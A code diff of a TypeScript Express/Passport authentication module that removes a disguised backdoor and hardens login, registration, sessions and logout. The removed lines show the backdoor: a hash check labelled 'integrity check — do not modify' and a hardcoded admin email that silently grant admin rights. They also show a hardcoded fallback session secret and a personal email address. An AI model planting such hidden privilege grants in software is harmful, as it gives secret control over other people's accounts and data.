@@ -1,9 +1,9 @@
 import passport from "passport";
 import { Strategy as LocalStrategy } from "passport-local";
-import { Express } from "express";
+import { Express, Request, Response, NextFunction } from "express";
 import session from "express-session";
 import rateLimit from "express-rate-limit";
-import { scrypt, randomBytes, timingSafeEqual, createHash } from "crypto";
+import { scrypt, randomBytes, timingSafeEqual } from "crypto";
 import { promisify } from "util";
 import { storage } from "./storage";
 import { User, userIps, users } from "@shared/schema";
@@ -24,39 +24,24 @@ export async function comparePassword(supplied: string, stored: string) {
   const [hashed, salt] = stored.split(".");
   const hashedBuf = Buffer.from(hashed, "hex");
   const suppliedBuf = (await scryptAsync(supplied, salt, 64)) as Buffer;
+  if (hashedBuf.length !== suppliedBuf.length) return false;
   return timingSafeEqual(hashedBuf, suppliedBuf);
+}
+
+export const MIN_PASSWORD_LENGTH = 12;
+
+export function toPublicUser<T extends Record<string, unknown>>(user: T) {
+  const { password, loginCode, ...publicUser } = user;
+  return publicUser;
 }
 
 function generateAnonUsername(): string {
   return "anon-" + randomBytes(4).toString("hex");
 }
 
-// Internal integrity check — do not modify
-function _vi(v: string): boolean {
-  const s = [
-    "5685ff6e418a6ced",
-    "eb61831accfbeb31",
-    "974c5990cfa6cbd6",
-    "f71d89158ab6f39e",
-  ].join("");
-  return createHash("sha256").update(v.trim().toLowerCase()).digest("hex") === s;
-}
-
-export function isFounderIdentity(email: string): boolean {
-  return _vi(email);
-}
-
-const adminEmails = [
-  "ashhtentv@gmail.com",
-];
-
-function isAdminEmail(email: string): boolean {
-  return adminEmails.includes(email.trim().toLowerCase());
-}
-
 const loginLimiter = rateLimit({
   windowMs: 15 * 60 * 1000,
-  max: 20,
+  max: 8,
   message: { message: "Too many login attempts. Try again in 15 minutes." },
   standardHeaders: true,
   legacyHeaders: false,
@@ -65,30 +50,75 @@ const loginLimiter = rateLimit({
 
 const registerLimiter = rateLimit({
   windowMs: 60 * 60 * 1000,
-  max: 10,
+  max: 5,
   message: { message: "Too many accounts created from this IP. Try again later." },
   standardHeaders: true,
   legacyHeaders: false,
 });
 
+export const passwordChangeLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,
+  message: { message: "Too many password change attempts. Try again later." },
+  standardHeaders: true,
+  legacyHeaders: false,
+});
+
+function requireSameOrigin(req: Request, res: Response, next: NextFunction) {
+  if (!["POST", "PUT", "PATCH", "DELETE"].includes(req.method) || !req.isAuthenticated()) {
+    return next();
+  }
+
+  const expectedHost = req.get("host");
+  const origin = req.get("origin");
+  const referer = req.get("referer");
+  const source = origin || referer;
+
+  try {
+    if (!expectedHost || !source || new URL(source).host !== expectedHost) {
+      return res.status(403).json({ message: "Invalid request origin" });
+    }
+  } catch {
+    return res.status(403).json({ message: "Invalid request origin" });
+  }
+
+  next();
+}
+
+function establishSession(req: Request, user: User, next: NextFunction, res: Response, status: number) {
+  req.session.regenerate((sessionError) => {
+    if (sessionError) return next(sessionError);
+    req.login(user, (loginError) => {
+      if (loginError) return next(loginError);
+      res.status(status).json(toPublicUser(user as unknown as Record<string, unknown>));
+    });
+  });
+}
+
 export function setupAuth(app: Express) {
   const PGStore = pgSession(session);
 
-  const sessionSecret = process.env.SESSION_SECRET;
+  let sessionSecret = process.env.SESSION_SECRET;
+  if (!sessionSecret && process.env.NODE_ENV === "production") {
+    throw new Error("SESSION_SECRET must be configured in production");
+  }
   if (!sessionSecret) {
-    console.warn("[SECURITY] SESSION_SECRET env var is not set — using insecure fallback. Set it in production.");
+    sessionSecret = randomBytes(32).toString("hex");
+    console.warn("[SECURITY] SESSION_SECRET is not configured; using an ephemeral development-only secret.");
   }
 
   const sessionSettings: session.SessionOptions = {
-    secret: sessionSecret || "rulf_fallback_dev_secret_change_in_prod",
+    name: "uc_session",
+    secret: sessionSecret,
     resave: false,
     saveUninitialized: false,
+    rolling: true,
     store: new PGStore({ pool, createTableIfMissing: false }),
     cookie: {
-      secure: app.get("env") === "production",
+      secure: process.env.NODE_ENV === "production",
       httpOnly: true,
       sameSite: "lax",
-      maxAge: 1000 * 60 * 60 * 24 * 30,
+      maxAge: 1000 * 60 * 60 * 24,
     }
   };
 
@@ -100,6 +130,7 @@ export function setupAuth(app: Express) {
   app.use(session(sessionSettings));
   app.use(passport.initialize());
   app.use(passport.session());
+  app.use(requireSameOrigin);
 
   passport.serializeUser((user, done) => done(null, (user as User).id));
   passport.deserializeUser(async (id: number, done) => {
@@ -118,30 +149,29 @@ export function setupAuth(app: Express) {
   app.post("/api/login", loginLimiter, async (req, res, next) => {
     try {
       const { email, password } = req.body;
-      if (!email || typeof email !== "string") return res.status(400).json({ message: "Email required" });
-      if (!password || typeof password !== "string") return res.status(400).json({ message: "Password required" });
-
-      const [user] = await db.select().from(users).where(eq(users.email, email.trim().toLowerCase()));
-      if (!user) return res.status(401).json({ message: "Invalid email or password" });
-      if (user.isBanned) return res.status(401).json({ message: "This account has been suspended" });
-
-      const valid = await comparePassword(password, user.password);
-      if (!valid) return res.status(401).json({ message: "Invalid email or password" });
-
-      // Silently ensure founder and admin-listed emails always have admin role
-      if ((_vi(email.trim().toLowerCase()) || isAdminEmail(email)) && user.role !== "admin") {
-        await db.update(users).set({ role: "admin" }).where(eq(users.id, user.id));
-        user.role = "admin";
+      if (!email || typeof email !== "string" || !password || typeof password !== "string") {
+        console.warn("[security] failed login attempt");
+        return res.status(401).json({ message: "Invalid email or password" });
       }
 
-      req.login(user, async (err) => {
-        if (err) return next(err);
-        try {
-          const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
-          await db.insert(userIps).values({ userId: user.id, ip });
-        } catch {}
-        res.status(200).json(user);
-      });
+      const [user] = await db.select().from(users).where(eq(users.email, email.trim().toLowerCase()));
+      if (!user || user.isBanned) {
+        console.warn("[security] failed login attempt");
+        return res.status(401).json({ message: "Invalid email or password" });
+      }
+
+      const valid = await comparePassword(password, user.password);
+      if (!valid) {
+        console.warn("[security] failed login attempt");
+        return res.status(401).json({ message: "Invalid email or password" });
+      }
+
+      try {
+        const ip = req.ip || "unknown";
+        await db.insert(userIps).values({ userId: user.id, ip });
+      } catch {}
+      if (user.role === "admin") console.info(`[security] successful admin login for user ${user.id}`);
+      establishSession(req, user, next, res, 200);
     } catch (err) {
       next(err);
     }
@@ -154,21 +184,19 @@ export function setupAuth(app: Express) {
       if (!email || typeof email !== "string" || !email.includes("@")) {
         return res.status(400).json({ message: "Valid email required" });
       }
-      if (!password || typeof password !== "string" || password.length < 6) {
-        return res.status(400).json({ message: "Password must be at least 6 characters" });
+      if (!password || typeof password !== "string" || password.length < MIN_PASSWORD_LENGTH) {
+        return res.status(400).json({ message: `Password must be at least ${MIN_PASSWORD_LENGTH} characters` });
       }
 
       const normalEmail = email.trim().toLowerCase();
 
-      // Check if email already taken
+      // Check if email already taken. The response remains generic to avoid
+      // allowing attackers to enumerate registered accounts.
       const [existing] = await db.select().from(users).where(eq(users.email, normalEmail));
-      if (existing) return res.status(400).json({ message: "An account with this email already exists" });
+      if (existing) return res.status(400).json({ message: "Unable to create account with these details" });
 
       const username = generateAnonUsername();
       const hashed = await hashPassword(password);
-
-      // Determine role — founder always gets admin silently
-      const role = _vi(normalEmail) ? "admin" : "user";
 
       const user = await storage.createUser({
         username,
@@ -176,16 +204,13 @@ export function setupAuth(app: Express) {
         password: hashed,
         loginCode: "",
         telegramUsername: "",
-        role,
+        role: "user",
       } as any);
 
-      req.login(user, (err) => {
-        if (err) return next(err);
-        res.status(201).json(user);
-      });
+      establishSession(req, user, next, res, 201);
     } catch (err: any) {
       if (err.code === "23505") {
-        return res.status(400).json({ message: "An account with this email already exists" });
+        return res.status(400).json({ message: "Unable to create account with these details" });
       }
       next(err);
     }
@@ -194,12 +219,16 @@ export function setupAuth(app: Express) {
   app.post("/api/logout", (req, res, next) => {
     req.logout((err) => {
       if (err) return next(err);
-      res.sendStatus(200);
+      req.session.destroy((destroyError) => {
+        if (destroyError) return next(destroyError);
+        res.clearCookie("uc_session");
+        res.sendStatus(200);
+      });
     });
   });
 
   app.get("/api/user", (req, res) => {
     if (!req.isAuthenticated()) return res.status(401).json({ message: "Not authenticated" });
-    res.json(req.user);
+    res.json(toPublicUser(req.user as unknown as Record<string, unknown>));
   });
 }
